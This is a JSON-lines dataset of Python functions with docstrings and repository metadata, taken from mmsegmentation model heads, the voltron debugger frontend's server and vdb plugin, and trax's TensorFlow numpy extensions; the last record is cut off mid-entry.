{"docstring": "\"\"\"Forward function.\"\"\"\n", "func_signal": "def forward(self, inputs):\n", "code": "x = self._transform_inputs(inputs)\nfeats = self.ema_in_conv(x)\nidentity = feats\nfeats = self.ema_mid_conv(feats)\nrecon = self.ema_module(feats)\nrecon = F.relu(recon, inplace=True)\nrecon = self.ema_out_conv(recon)\noutput = F.relu(identity + recon, inplace=True)\noutput = self.bottleneck(output)\nif self.concat_input:\n    output = self.conv_cat(torch.cat([x, output], dim=1))\noutput = self.cls_seg(output)\nreturn output", "path": "mmsegmentation/mmseg/models/decode_heads/ema_head.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n\n", "func_signal": "def forward(self, x):\n", "code": "if self.with_cp and x.requires_grad:\n    out = cp.checkpoint(self.convs, x)\nelse:\n    out = self.convs(x)\nreturn out", "path": "mmsegmentation/mmseg/models/backbones/unet.py", "commit_date": "2020-10-21 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Collect the information of the running environments.\"\"\"\n", "func_signal": "def collect_env():\n", "code": "env_info = collect_base_env()\nenv_info['MMSegmentation'] = f'{mmseg.__version__}+{get_git_hash()[:7]}'\n\nreturn env_info", "path": "mmsegmentation/mmseg/utils/collect_env.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Initialize the weights in backbone.\n\nArgs:\n    pretrained (str, optional): Path to pre-trained weights.\n        Defaults to None.\n\"\"\"\n", "func_signal": "def init_weights(self, pretrained=None):\n", "code": "if isinstance(pretrained, str):\n    logger = get_root_logger()\n    load_checkpoint(self, pretrained, strict=False, logger=logger)\nelif pretrained is None:\n    for m in self.modules():\n        if isinstance(m, (nn.Conv2d, nn.Linear)):\n            kaiming_init(m)\n        elif isinstance(m, (_BatchNorm, nn.GroupNorm)):\n            constant_init(m, 1)\n        elif isinstance(m, nn.PReLU):\n            constant_init(m, 0)\nelse:\n    raise TypeError('pretrained must be a str or None')", "path": "mmsegmentation/mmseg/models/backbones/cgnet.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n", "func_signal": "def forward(self, inputs):\n", "code": "x = self._transform_inputs(inputs)\noutput = self.convs[0](x)\nfor _ in range(self.recurrence):\n    output = self.cca(output)\noutput = self.convs[1](output)\nif self.concat_input:\n    output = self.conv_cat(torch.cat([x, output], dim=1))\noutput = self.cls_seg(output)\nreturn output", "path": "mmsegmentation/mmseg/models/decode_heads/cc_head.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Reduce loss as specified.\n\nArgs:\n    loss (Tensor): Elementwise loss tensor.\n    reduction (str): Options are \"none\", \"mean\" and \"sum\".\n\nReturn:\n    Tensor: Reduced loss tensor.\n\"\"\"\n", "func_signal": "def reduce_loss(loss, reduction):\n", "code": "reduction_enum = F._Reduction.get_enum(reduction)\n# none: 0, elementwise_mean:1, sum: 2\nif reduction_enum == 0:\n    return loss\nelif reduction_enum == 1:\n    return loss.mean()\nelif reduction_enum == 2:\n    return loss.sum()", "path": "mmsegmentation/mmseg/models/losses/utils.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function of PSP module.\"\"\"\n", "func_signal": "def psp_forward(self, inputs):\n", "code": "x = inputs[-1]\npsp_outs = [x]\npsp_outs.extend(self.psp_modules(x))\npsp_outs = torch.cat(psp_outs, dim=1)\noutput = self.bottleneck(psp_outs)\n\nreturn output", "path": "mmsegmentation/mmseg/models/decode_heads/uper_head.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n", "func_signal": "def forward(self, feats):\n", "code": "batch_size, channels, height, width = feats.size()\n# [batch_size, channels, height*width]\nfeats = feats.view(batch_size, channels, height * width)\n# [batch_size, channels, num_bases]\nbases = self.bases.repeat(batch_size, 1, 1)\n\nwith torch.no_grad():\n    for i in range(self.num_stages):\n        # [batch_size, height*width, num_bases]\n        attention = torch.einsum('bcn,bck->bnk', feats, bases)\n        attention = F.softmax(attention, dim=2)\n        # l1 norm\n        attention_normed = F.normalize(attention, dim=1, p=1)\n        # [batch_size, channels, num_bases]\n        bases = torch.einsum('bcn,bnk->bck', feats, attention_normed)\n        # l2 norm\n        bases = F.normalize(bases, dim=1, p=2)\n\nfeats_recon = torch.einsum('bck,bnk->bcn', bases, attention)\nfeats_recon = feats_recon.view(batch_size, channels, height, width)\n\nif self.training:\n    bases = bases.mean(dim=0, keepdim=True)\n    bases = reduce_mean(bases)\n    # l2 norm\n    bases = F.normalize(bases, dim=1, p=2)\n    self.bases = (1 -\n                  self.momentum) * self.bases + self.momentum * bases\n\nreturn feats_recon", "path": "mmsegmentation/mmseg/models/decode_heads/ema_head.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Convert the model into training mode whill keeping the normalization\nlayer freezed.\"\"\"\n", "func_signal": "def train(self, mode=True):\n", "code": "super(CGNet, self).train(mode)\nif mode and self.norm_eval:\n    for m in self.modules():\n        # trick: eval have effect on BatchNorm only\n        if isinstance(m, _BatchNorm):\n            m.eval()", "path": "mmsegmentation/mmseg/models/backbones/cgnet.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Reduce mean when distributed training.\"\"\"\n", "func_signal": "def reduce_mean(tensor):\n", "code": "if not (dist.is_available() and dist.is_initialized()):\n    return tensor\ntensor = tensor.clone()\ndist.all_reduce(tensor.div_(dist.get_world_size()), op=dist.ReduceOp.SUM)\nreturn tensor", "path": "mmsegmentation/mmseg/models/decode_heads/ema_head.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n\n", "func_signal": "def forward(self, inputs):\n", "code": "inputs = self._transform_inputs(inputs)\n\n# build laterals\nlaterals = [\n    lateral_conv(inputs[i])\n    for i, lateral_conv in enumerate(self.lateral_convs)\n]\n\nlaterals.append(self.psp_forward(inputs))\n\n# build top-down path\nused_backbone_levels = len(laterals)\nfor i in range(used_backbone_levels - 1, 0, -1):\n    prev_shape = laterals[i - 1].shape[2:]\n    laterals[i - 1] += resize(\n        laterals[i],\n        size=prev_shape,\n        mode='bilinear',\n        align_corners=self.align_corners)\n\n# build outputs\nfpn_outs = [\n    self.fpn_convs[i](laterals[i])\n    for i in range(used_backbone_levels - 1)\n]\n# append psp feature\nfpn_outs.append(laterals[-1])\n\nfor i in range(used_backbone_levels - 1, 0, -1):\n    fpn_outs[i] = resize(\n        fpn_outs[i],\n        size=fpn_outs[0].shape[2:],\n        mode='bilinear',\n        align_corners=self.align_corners)\nfpn_outs = torch.cat(fpn_outs, dim=1)\noutput = self.fpn_bottleneck(fpn_outs)\noutput = self.cls_seg(output)\nreturn output", "path": "mmsegmentation/mmseg/models/decode_heads/uper_head.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n", "func_signal": "def forward(self, inputs):\n", "code": "x = self._transform_inputs(inputs)\npsp_outs = [x]\npsp_outs.extend(self.psp_modules(x))\npsp_outs = torch.cat(psp_outs, dim=1)\noutput = self.bottleneck(psp_outs)\noutput = self.cls_seg(output)\nreturn output", "path": "mmsegmentation/mmseg/models/decode_heads/psp_head.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Forward function.\"\"\"\n", "func_signal": "def forward(self, inputs):\n", "code": "x = self._transform_inputs(inputs)\noutput = self.convs[0](x)\noutput = self.gc_block(output)\noutput = self.convs[1](output)\nif self.concat_input:\n    output = self.conv_cat(torch.cat([x, output], dim=1))\noutput = self.cls_seg(output)\nreturn output", "path": "mmsegmentation/mmseg/models/decode_heads/gc_head.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"Create a weighted version of a given loss function.\n\nTo use this decorator, the loss function must have the signature like\n`loss_func(pred, target, **kwargs)`. The function only needs to compute\nelement-wise loss without any reduction. This decorator will add weight\nand reduction arguments to the function. The decorated function will have\nthe signature like `loss_func(pred, target, weight=None, reduction='mean',\navg_factor=None, **kwargs)`.\n\n:Example:\n\n>>> import torch\n>>> @weighted_loss\n>>> def l1_loss(pred, target):\n>>>     return (pred - target).abs()\n\n>>> pred = torch.Tensor([0, 2, 3])\n>>> target = torch.Tensor([1, 1, 1])\n>>> weight = torch.Tensor([1, 0, 1])\n\n>>> l1_loss(pred, target)\ntensor(1.3333)\n>>> l1_loss(pred, target, weight)\ntensor(1.)\n>>> l1_loss(pred, target, reduction='none')\ntensor([1., 1., 2.])\n>>> l1_loss(pred, target, weight, avg_factor=2)\ntensor(1.5000)\n\"\"\"\n\n", "func_signal": "def weighted_loss(loss_func):\n", "code": "@functools.wraps(loss_func)\ndef wrapper(pred,\n            target,\n            weight=None,\n            reduction='mean',\n            avg_factor=None,\n            **kwargs):\n    # get element-wise loss\n    loss = loss_func(pred, target, **kwargs)\n    loss = weight_reduce_loss(loss, weight, reduction, avg_factor)\n    return loss\n\nreturn wrapper", "path": "mmsegmentation/mmseg/models/losses/utils.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "open-mmlab/mmsegmentation", "stars": 7159, "license": "apache-2.0", "language": "python", "size": 45261}
{"docstring": "\"\"\"\nStop the server.\n\"\"\"\n", "func_signal": "def stop(self):\n", "code": "log.debug(\"Stopping listeners\")\nself.queue_lock.acquire()\nfor s in self.listeners:\n    log.debug(\"Stopping {}\".format(s))\n    s.shutdown()\n    s.socket.close()\nself.cancel_queue()\nfor t in self.threads:\n    t.join()\nself.listeners = []\nself.threads = []\nself.is_running = False\nself.queue_lock.release()\nlog.debug(\"Listeners stopped and threads joined\")", "path": "voltron/voltron/core.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nGet the value of the stack pointer register.\n`target_id` is ignored.\n\"\"\"\n", "func_signal": "def stack_pointer(self, target_id=0, thread_id=None):\n", "code": "arch = self.get_arch()\nif arch in self.reg_names:\n    sp_name = self.reg_names[arch]['sp']\n    sp = self.get_register(sp_name)\nelse:\n    raise UnknownArchitectureException()\n\nreturn sp_name, sp", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nSend a request to the server.\n\n`request` is an APIRequest subclass.\n\nReturns an APIResponse or subclass instance. If an error occurred, it\nwill be an APIErrorResponse, if the request was successful it will be\nthe plugin's specified response class if one exists, otherwise it will\nbe an APIResponse.\n\"\"\"\n# default to an empty response error\n", "func_signal": "def send_request(self, request):\n", "code": "res = APIEmptyResponseErrorResponse()\n\n# perform the request\nlog.debug(\"Client sending request: \" + str(request))\nresponse = self.session.post(self.url, data=str(request))\ndata = response.text\nif response.status_code != 200:\n    res = APIGenericErrorResponse(response.text)\nelif data and len(data) > 0:\n    log.debug('Client received message: ' + data)\n\n    try:\n        # parse the response data\n        generic_response = APIResponse(data=data)\n\n        # if there's an error, return an error response\n        if generic_response.is_error:\n            res = APIErrorResponse(data=data)\n        else:\n            # success; generate a proper response\n            plugin = voltron.plugin.pm.api_plugin_for_request(request.request)\n            if plugin and plugin.response_class:\n                # found a plugin for the request we sent, use its response type\n                res = plugin.response_class(data=data)\n            else:\n                # didn't find a plugin, just return the generic APIResponse we already generated\n                res = generic_response\n    except Exception as e:\n        log.exception('Exception parsing message: ' + str(e))\n        log.error('Invalid message: ' + data)\nelse:\n    res = APIEmptyResponseErrorResponse()\n\nreturn res", "path": "voltron/voltron/core.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nGet the state of a given target. Internal use.\n\"\"\"\n", "func_signal": "def _state(self):\n", "code": "if not self._vdb.getTrace().isAttached():\n    state = \"invalid\"\nelse:\n    if self._vdb.getTrace().isRunning():\n        state = \"running\"\n    else:\n        state = \"stopped\"\nreturn state", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nReturn information about the specified target.\n\nReturns data in the following structure:\n{\n    \"id\":       0,         # ID that can be used in other funcs\n    \"file\":     \"/bin/ls\", # target's binary file\n    \"arch\":     \"x86_64\",  # target's architecture\n    \"state:     \"stopped\"  # state\n}\n\"\"\"\n", "func_signal": "def _target(self, target_id=0):\n", "code": "d = {}\nd[\"id\"] = 0\nd[\"state\"] = self._state()\nd[\"file\"] = self._vdb.getTrace().metadata['ExeName']\nd[\"arch\"] = self.get_arch()\nd['byte_order'] = self.get_byte_order()\nd['addr_size'] = self.get_addr_size()\nreturn d", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nUpdate the display\n\"\"\"\n# build requests for this iteration\n", "func_signal": "def update(self):\n", "code": "reqs = self.build_requests()\nfor r in reqs:\n    r.block = self.block\nresults = self.send_requests(*reqs)\n\n# call callback with the results\nself.callback(results)", "path": "voltron/voltron/core.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nGet the register values for a given target/thread.\n`target_id` is ignored.\n\"\"\"\n", "func_signal": "def registers(self, target_id=0, thread_id=None, registers=[]):\n", "code": "arch = self.get_arch()\n\nif arch in self.reg_names:\n    if 'pc' in registers:\n        registers.remove('pc')\n        registers.append(self.reg_names[arch]['pc'])\n    if 'sp' in registers:\n        registers.remove('sp')\n        registers.append(self.reg_names[arch]['sp'])\nelse:\n    raise Exception(\"Unsupported architecture: {}\".format(target['arch']))\n\nif registers != []:\n    regs = {}\n    for reg in registers:\n        regs[reg] = self.get_register(reg)\nelse:\n    log.debug('Getting registers for arch {}'.format(arch))\n    if arch == \"x86_64\":\n        regs = self.get_registers_x86_64()\n    elif arch == \"x86\":\n        regs = self.get_registers_x86()\n    elif arch == \"arm\":\n        regs = self.get_registers_arm()\n    else:\n        raise UnknownArchitectureException()\n\nreturn regs", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nGet the number of bytes used to represent the `n` instructions\n  at `address`.\n\n`address` is the starting address of the sequence of instructions.\n`count` is the number of instructions to decode.\n\"\"\"\n", "func_signal": "def _get_n_opcodes_length(self, address, count):\n", "code": "length = 0\nt = self._vdb.getTrace()\narch = self._vdb.arch.getArchId()\nfor i in xrange(count):\n    op = t.parseOpcode(address + length, arch=arch)\n    length += op.size\nreturn length", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nStart the server.\n\"\"\"\n", "func_signal": "def start(self):\n", "code": "plugins = voltron.plugin.pm.web_plugins\nself.app = DispatcherMiddleware(\n    RootFlaskApp(),\n    {\n        \"/api\": APIFlaskApp(server=self),\n        \"/view\": SharedDataMiddleware(\n            None,\n            {'/{}'.format(n): os.path.join(p._dir, 'static') for (n, p) in six.iteritems(plugins)}\n        ),\n        \"/ui\": ui_app\n    }\n)\n\ndef run_listener(name, cls, arg):\n    # with pysigset.suspended_signals(signal.SIGCHLD):\n    log.debug(\"Starting listener for {} socket on {}\".format(name, str(arg)))\n    s = cls(*arg)\n    t = threading.Thread(target=s.serve_forever)\n    t.daemon = True\n    t.start()\n    self.threads.append(t)\n    self.listeners.append(s)\n\nif voltron.config.server.listen.tcp:\n    run_listener('tcp', ThreadedVoltronWSGIServer, list(voltron.config.server.listen.tcp) + [self.app])\n\nif voltron.config.server.listen.domain and sys.platform != 'win32':\n    path = os.path.expanduser(str(voltron.config.server.listen.domain))\n    try:\n        os.unlink(path)\n    except:\n        pass\n    run_listener('domain', ThreadedUnixWSGIServer, [path, self.app])\n\nself.is_running = True", "path": "voltron/voltron/core.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nvdb is the debugger instance\nvtrace is the vtrace module?\n\"\"\"\n", "func_signal": "def __init__(self, host):\n", "code": "super(VDBCommand, self).__init__()\nself._vdb = host\nself._vtrace = vtrace\nself.register_hooks()", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nGet the ASCII string of length at least `min_length`, but\n not more than `max_length` of it, or raise\n `NotAStringError` if it doesnt look like an ASCII string.\n\"\"\"\n", "func_signal": "def _get_ascii_string(self, address, min_length=4, max_length=32):\n", "code": "cs = []\nfor i in xrange(max_length):\n    try:\n        c = self.memory(address + i, 1)[0]\n    except FailedToReadMemoryError:\n        break\n    if ord(c) == 0:\n        break\n    elif c not in string.printable:\n        break\n    else:\n        cs.append(c)\n\nif len(cs) >= min_length:\n    return \"\".join(cs)\nelse:\n    raise NotAStringError()", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nGet the value of the program counter register.\n`target_id` is ignored.\n\"\"\"\n", "func_signal": "def program_counter(self, target_id=0, thread_id=None):\n", "code": "arch = self.get_arch()\nif arch in self.reg_names:\n    pc_name = self.reg_names[arch]['pc']\n    pc = self.get_register(pc_name)\nelse:\n    raise UnknownArchitectureException()\n\nreturn pc_name, pc", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nRun the client using a background thread.\n\"\"\"\n", "func_signal": "def start(self, build_requests=None, callback=None):\n", "code": "if callback:\n    self.callback = callback\nif build_requests:\n    self.build_requests = build_requests\n\n# spin off requester thread\nself.sw = threading.Thread(target=self.run)\nself.sw.start()", "path": "voltron/voltron/core.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nGet the register values for .\nRaises `FailedToReadMemoryError` if... that happens.\n\n`address` is the address at which to start reading\n`length` is the number of bytes to read\n`target_id` is ignored.\n\"\"\"\n", "func_signal": "def memory(self, address, length, target_id=0):\n", "code": "log.debug('Reading 0x{:x} bytes of memory at 0x{:x}'.format(length, address))\nt = self._vdb.getTrace()\ntry:\n    return t.readMemory(address, length)\nexcept:\n    raise FailedToReadMemoryError()", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nDispatch any queued requests.\n\nCalled by the debugger when it stops.\n\"\"\"\n", "func_signal": "def dispatch_queue(self):\n", "code": "self.queue_lock.acquire()\nq = list(self.queue)\nself.queue = []\nself.queue_lock.release()\nlog.debug(\"Dispatching requests: {}\".format(q))\nfor req in q:\n    req.response = self.dispatch_request(req)\nfor req in q:\n    req.signal()", "path": "voltron/voltron/core.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nSend a set of requests.\n\nEach request is sent over its own connection and the function will\nreturn when all the requests have been fulfilled.\n\"\"\"\n", "func_signal": "def send_requests(self, *args):\n", "code": "threads = [ClientThread(self, req) for req in args]\nfor t in threads:\n    t.start()\nfor t in threads:\n    t.join()\nexceptions = [t.exception for t in threads if t.exception]\nif len(exceptions):\n    raise exceptions[0]\nreturn [t.response for t in threads]", "path": "voltron/voltron/core.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nExecute a command in the debugger.\n\n`command` is the command string to execute.\n\"\"\"\n", "func_signal": "def command(self, command=None):\n", "code": "if command:\n    # well, this is hacky...\n    # hook the canvas to capture a command's output\n    oldcan = self._vdb.canvas\n    newcan = envi.memcanvas.StringMemoryCanvas(self._vdb.memobj, self._vdb.symobj)\n    try:\n        self._vdb.canvas = newcan\n        self._vdb.onecmd(command)\n    finally:\n        self._vdb.canvas = oldcan\n    return str(newcan).rstrip(\"\\n\")\nelse:\n    raise Exception(\"No command specified\")\n\nreturn res", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nDispatch a request object.\n\"\"\"\n", "func_signal": "def dispatch_request(self, req):\n", "code": "log.debug(\"Dispatching request: {}\".format(str(req)))\n\n# make sure it's valid\nres = None\ntry:\n    req.validate()\nexcept MissingFieldError as e:\n    res = APIMissingFieldErrorResponse(str(e))\n\n# dispatch the request\nif not res:\n    try:\n        res = req.dispatch()\n    except Exception as e:\n        msg = \"Exception raised while dispatching request: {}\".format(repr(e))\n        log.exception(msg)\n        res = APIGenericErrorResponse(msg)\n\nlog.debug(\"Response: {}\".format(str(res)))\n\nreturn res", "path": "voltron/voltron/core.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nGet a disassembly of the instructions at the given address.\n\n`address` is the address at which to disassemble. If None, the\ncurrent program counter is used.\n`count` is the number of instructions to disassemble.\n\"\"\"\n", "func_signal": "def disassemble(self, target_id=0, address=None, count=16):\n", "code": "if address == None:\n    pc_name, address = self.program_counter(target_id=target_id)\n\nlength = self._get_n_opcodes_length(address, count)\ncan = envi.memcanvas.StringMemoryCanvas(self._vdb.memobj, self._vdb.symobj)\ncan.renderMemory(address, length, self._vdb.opcoderend)\nreturn str(can)", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"\nRecursively dereference a pointer for display\n`target_id` is ignored.\n\"\"\"\n", "func_signal": "def dereference(self, pointer, target_id=0):\n", "code": "fmt = ('<' if self.get_byte_order() == 'little' else '>') + {2: 'H', 4: 'L', 8: 'Q'}[self.get_addr_size()]\n\naddr = pointer\nchain = []\n\n# recursively dereference\nwhile True:\n    try:\n        mem = self.memory(addr, self.get_addr_size())\n    except FailedToReadMemoryError:\n        break\n    except Exception as e:\n        print(e)\n        print(type(e))\n        print(e.__class__.__name__)\n        break\n    log.debug(\"read mem: {}\".format(mem))\n    (ptr,) = struct.unpack(fmt, mem)\n    if ptr in chain:\n        break\n    chain.append(('pointer', addr))\n    addr = ptr\n\n# get some info for the last pointer\n# first try to resolve a symbol context for the address\np, addr = chain[-1]\noutput = self._vdb.reprPointer(addr)\nif \"Who knows?!?!!?\" not in output:\n    chain.append(('symbol', output))\n    log.debug(\"symbol context: {}\".format(str(chain[-1])))\nelse:\n    log.debug(\"no symbol context\")\n    try:\n        chain.append((\"string\", self._get_ascii_string(addr)))\n    except NotAStringError:\n        try:\n            chain.append((\"string\", self._get_unicode_string(addr)))\n        except NotAStringError:\n            pass\n\nlog.debug(\"chain: {}\".format(chain))\nreturn chain", "path": "voltron/voltron/plugins/debugger/dbg_vdb.py", "commit_date": "2016-09-02 00:00:00", "repo_name": "snare/voltron", "stars": 6072, "license": "mit", "language": "python", "size": 1704}
{"docstring": "\"\"\"Converts an RNG seed to an RNG key.\n\nArgs:\n  a: an RNG seed, a tensor of shape [2] and dtype `tf.int32`.\n\nReturns:\n  an RNG key, an ndarray of shape [] and dtype `np.int64`.\n\"\"\"\n\n", "func_signal": "def _seed2key(a):\n", "code": "def int32s_to_int64(a):\n  \"\"\"Converts an int32 tensor of shape [2] to an int64 tensor of shape [].\"\"\"\n  a = tf.bitwise.bitwise_or(\n      tf.cast(a[0], tf.uint64),\n      tf.bitwise.left_shift(\n          tf.cast(a[1], tf.uint64), tf.constant(32, tf.uint64)))\n  a = tf.cast(a, tf.int64)\n  return a\n\nreturn tf_np.asarray(int32s_to_int64(a))", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Returns the result and the VJP function of `f`.\n\nThis function returns the result and the vector-Jacobian-product (VJP)\nfunction of `f`.\n\nArgs:\n  f: a function from (nested structures of) tf_np.ndarrays to a (nested\n    structure of) tf_np.ndarray. If `has_aux` is True, it should return an\n    extra output.\n  *primals: the inputs to be fed to `f`.\n  has_aux: if True, the second output of `f` will be regarded as an auxiliary,\n    non-differentiable output that will be ignored by the VJP function.\n\nReturns:\n  A pair `(y, vjpfun)` if `has_aux` is False; a tuple `(y, vjpfun, aux)`\n  otherwise. `y` and `aux` are the outputs of `f`, i.e. `y, aux =\n  f(*primals)`. `vjpfun` is a function `dx = vjpfun(dy)`, where `dy` is the\n  cotengents of `y`, having the same structures, shapes and dtypes as\n  `y`. `dx` is the cotengents of `x`, having the same structures, shapes and\n  dtypes as `x`.\n\"\"\"\n", "func_signal": "def vjp(f, *primals, has_aux=False):\n", "code": "tf_primals = _np_to_tf(primals)\nwith tf.GradientTape(persistent=True) as tape:\n  tape.watch(tf.nest.flatten(tf_primals))\n  outputs = f(*primals)\n  if has_aux:\n    np_out, aux = outputs\n  else:\n    np_out = outputs\n  tf_out = _np_to_tf(np_out)\n\n  def _vjp(dy):\n    tf_dy = _np_to_tf(dy)\n    tf_dx = tape.gradient(tf_out, tf_primals, output_gradients=tf_dy)\n    return _tf_to_np(tf_dx)\n\nif has_aux:\n  ret = (np_out, _vjp, aux)\nelse:\n  ret = (np_out, _vjp)\nreturn ret", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Initializes TPU for TensorFlow.\n\nArgs:\n  worker: The BNS address of the remote TPU worker. If it's empty (the default\n    value), TF will assume the TPU devices are connected to the local host.\n  protocol: The network protocol used to connect to the TPU worker.\nReturns:\n  The device name of the TPU worker's CPU.\n\"\"\"\n", "func_signal": "def tf_init_tpu(worker='', protocol=None):\n", "code": "protocol = protocol or 'grpc'\nis_local = (worker in ('', 'local'))\nresolver = tf.distribute.cluster_resolver.TPUClusterResolver(tpu=worker)\nif not is_local:\n  tf.config.experimental_connect_to_cluster(resolver, protocol=protocol)\ntf.tpu.experimental.initialize_tpu_system(resolver)\nif is_local:\n  return ''\nelse:\n  return '/job:worker'", "path": "trax/trax/trainer.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Performs an N-D max pooling.\n\nArgs:\n  x: ndarray of rank N+2, of shape `[batch_size] + input_spatial_shape +\n    [num_channels]`. Pooling happens over the spatial dimensions only.\n  pool_size: sequence of N ints.\n  strides: sequence of N ints.\n  padding: a string, the padding algorithm. Must be \"SAME\" or \"VALID\".\n\nReturns:\n  An (N+2)-D array,  of shape\n    [batch_size] + output_spatial_shape + [num_channels],\n  where `output_spatial_shape` depends on the value of padding:\n  If padding = \"SAME\":\n    output_spatial_shape[i] = ceil(input_spatial_shape[i] / strides[i])\n  If padding = \"VALID\":\n    output_spatial_shape[i] =\n      ceil((input_spatial_shape[i] - (pool_size[i] - 1)) / strides[i]).\n\"\"\"\n", "func_signal": "def max_pool(x, pool_size, strides, padding):\n", "code": "x = tf_np.asarray(x)\nreturn tf_np.asarray(\n    tf.nn.pool(\n        input=x,\n        window_shape=pool_size,\n        pooling_type=\"MAX\",\n        strides=strides,\n        padding=padding))", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", 